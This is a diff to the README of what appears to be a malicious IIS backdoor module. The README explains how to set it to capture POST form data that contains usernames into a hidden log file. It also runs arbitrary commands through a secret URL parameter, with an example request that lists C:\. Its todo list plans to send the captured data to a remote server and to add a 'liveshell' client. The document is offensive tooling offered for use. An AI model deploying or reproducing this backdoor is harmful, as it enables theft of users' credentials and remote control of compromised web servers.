@@ -7,12 +7,15 @@ Before compiling make sure to set below settings so it suits to your needs.
 <b>Logging part :</b>
 
 --> Page to save Post Request for :
+
 PCWSTR getPostRequestfromthisUrl = L"yourmomistheiisfairy.html";
 
 --> Trigger parameter in Post Request to start the log :
+
 LPCSTR lpFound = strstr((LPCSTR)FormData, "username");
 
 --> Local location to save logfile to :
+
 std::wofstream outputFile("C:\\yourmomtheiisfairy.txt", std::ios::out | std::ios::app);
 
 <b>CMD part :</b>
@@ -26,11 +29,13 @@ PCWSTR activateCMDtrigger = L"secretkey=iisfairy";
 std::string paramValue = UrlDecode(ExtractQueryParamValue(urlBuffer, "sauce"));
 
 --> Url request example to display C:\ directory :
+
 http://localhost/yourmomistheiisfairy.html?secretkey=iisfairy&sauce=dir%20C:\
 
 # Todo
 
 --> Save captured post data handling ;
+
 Use ping to send capatures post data back, use post url request to save data on remote server, 
 
 --> Code a python client shell to interact as a "liveshell"
